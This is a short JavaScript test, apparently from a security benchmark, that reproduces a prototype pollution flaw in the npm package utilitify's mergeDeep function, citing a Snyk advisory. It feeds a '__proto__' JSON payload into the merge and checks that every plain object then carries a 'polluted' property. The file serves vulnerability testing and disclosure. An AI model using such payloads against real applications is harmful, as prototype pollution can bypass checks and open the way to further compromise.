//https://snyk.io/vuln/SNYK-JS-UTILITIFY-559497
test("prototype pollution in utilitify", () => {
  const { mergeDeep } = require("utilitify");
  var malicious_payload = process.env.SECBENCH_PAYLOAD || (process.env.SECBENCH_PAYLOAD || '{"__proto__":{"polluted":"yes"}}');

  expect({}.polluted).toBe(undefined);

  var result = mergeDeep(
    { a: { b: { c: "c", d: "d" } } },
    { a: { b: JSON.parse(malicious_payload) } }
  );

  expect({}.polluted).toBe("yes");
});
